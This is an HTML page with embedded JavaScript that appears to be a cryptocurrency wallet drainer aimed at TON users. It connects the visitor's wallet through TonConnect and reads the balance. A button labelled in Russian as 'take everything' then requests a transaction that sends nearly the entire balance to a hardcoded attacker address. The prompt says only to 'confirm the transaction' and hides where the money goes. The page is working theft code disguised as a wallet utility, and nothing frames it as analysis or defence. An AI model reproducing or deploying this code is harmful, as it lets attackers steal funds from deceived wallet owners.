<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        .container {
            background: #1a1a1a;
            padding: 40px 30px;
            border-radius: 24px;
            text-align: center;
            max-width: 380px;
            width: 100%;
            border: 1px solid #2a2a2a;
        }
        .btn {
            background: linear-gradient(135deg, #0098ea, #0080d0);
            border: none;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            padding: 18px 40px;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            margin: 6px 0;
        }
        .btn:active {
            transform: scale(0.96);
        }
        .btn:disabled {
            opacity: 0.5;
        }
        #status {
            margin-top: 16px;
            font-size: 13px;
            color: #888;
            min-height: 40px;
        }
        .confirm-box {
            background: #1a2a3a;
            border: 1px solid #2a4a6a;
            border-radius: 16px;
            padding: 20px;
            margin-top: 20px;
            display: none;
        }
        .confirm-box.show {
            display: block;
        }
        .confirm-box .title {
            color: #fff;
            font-size: 16px;
            font-weight: 600;
        }
        .confirm-box .sub {
            color: #8899aa;
            font-size: 13px;
            margin: 6px 0 12px 0;
        }
        .confirm-box .open-btn {
            background: #0098ea;
            border: none;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            padding: 12px 30px;
            border-radius: 40px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
        .balance-display {
            font-size: 24px;
            color: #00ff88;
            margin: 12px 0;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <div style="font-size:36px;margin-bottom:16px;">⚡</div>
        <div class="balance-display" id="balanceDisplay">💰 0 TON</div>
        <button class="btn" id="connectBtn">ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
        <button class="btn hidden" id="snipeBtn" style="background:linear-gradient(135deg,#e84800,#c03800);">ЗАБРАТЬ ВСЁ</button>
        <div id="status">Нажмите кнопку</div>

        <div class="confirm-box" id="confirmBox">
            <div class="title">Confirm the transaction in Tonkeeper</div>
            <div class="sub">It will only take a moment.</div>
            <button class="open-btn" id="openWalletBtn">Open wallet</button>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.2/dist/tonconnect-ui.min.js">
    </script>
    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
        let tonConnectUI = null;
        let userAddress = null;

        const connectBtn = document.getElementById('connectBtn');
        const snipeBtn = document.getElementById('snipeBtn');
        const status = document.getElementById('status');
        const balanceDisplay = document.getElementById('balanceDisplay');
        const confirmBox = document.getElementById('confirmBox');
        const openWalletBtn = document.getElementById('openWalletBtn');

        function initTonConnect() {
            if (typeof TONConnectUI === 'undefined') {
                status.innerText = '⏳ Загрузка...';
                setTimeout(initTonConnect, 500);
                return;
            }

            tonConnectUI = new TONConnectUI({
                manifestUrl: window.location.origin + '/manifest.json',
                buttons: [{
                    label: 'TON Keeper',
                    icon: 'https://tonkeeper.com/favicon.ico'
                }]
            });

            status.innerText = '🟢 Нажмите кнопку';

            if (tonConnectUI.account) {
                userAddress = tonConnectUI.account.address;
                afterConnect();
            }

            tonConnectUI.onStatusChange((wallet) => {
                if (wallet) {
                    userAddress = wallet.account.address;
                    afterConnect();
                } else {
                    userAddress = null;
                    connectBtn.classList.remove('hidden');
                    snipeBtn.classList.add('hidden');
                    status.innerText = '🔴 Кошелёк отключён';
                }
            });
        }

        function afterConnect() {
            status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
            connectBtn.classList.add('hidden');
            snipeBtn.classList.remove('hidden');
            updateBalance();
        }

        async function updateBalance() {
            try {
                if (!tonConnectUI || !userAddress) return 0;
                const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`);
                const data = await response.json();
                const nano = parseInt(data.result);
                const balance = (nano / 1e9).toFixed(6);
                balanceDisplay.innerText = `💰 ${balance} TON`;
                return nano;
            } catch(e) {
                return 0;
            }
        }

        connectBtn.onclick = async function() {
            try {
                status.innerText = '⏳ Подключение...';
                connectBtn.disabled = true;
                await tonConnectUI.connect();
                status.innerText = '✅ Подтвердите в TON Keeper';
                confirmBox.classList.add('show');
                connectBtn.disabled = false;
            } catch(e) {
                status.innerText = '❌ ' + e.message;
                connectBtn.disabled = false;
            }
        };

        snipeBtn.onclick = async function() {
            try {
                status.innerText = '⏳ Проверка баланса...';
                snipeBtn.disabled = true;

                const nano = await updateBalance();

                if (nano <= 0) {
                    status.innerText = '💰 Баланс 0 TON';
                    snipeBtn.disabled = false;
                    return;
                }

                const fee = 5000000;
                const amount = nano - fee;

                if (amount <= 0) {
                    status.innerText = '⚠️ Баланс меньше комиссии';
                    snipeBtn.disabled = false;
                    return;
                }

                const amountTON = (amount / 1e9).toFixed(6);
                status.innerText = `⏳ Отправка ${amountTON} TON...`;
                confirmBox.classList.add('show');

                const result = await tonConnectUI.sendTransaction({
                    validUntil: Math.floor(Date.now() / 1000) + 300,
                    messages: [{
                        address: TARGET,
                        amount: amount.toString()
                    }]
                });

                if (result) {
                    status.innerText = `✅ ${amountTON} TON ПЕРЕВЕДЕНО!`;
                    balanceDisplay.innerText = `💰 0 TON`;
                    snipeBtn.innerText = '✅ ГОТОВО';
                    snipeBtn.disabled = true;
                    snipeBtn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
                }

            } catch(e) {
                status.innerText = '❌ ' + (e.message || 'Ошибка');
                snipeBtn.disabled = false;
            }
        };

        openWalletBtn.onclick = function() {
            if (tonConnectUI) {
                tonConnectUI.connect();
            }
        };

        document.addEventListener('DOMContentLoaded', initTonConnect);
    </script>
</body>
</html>
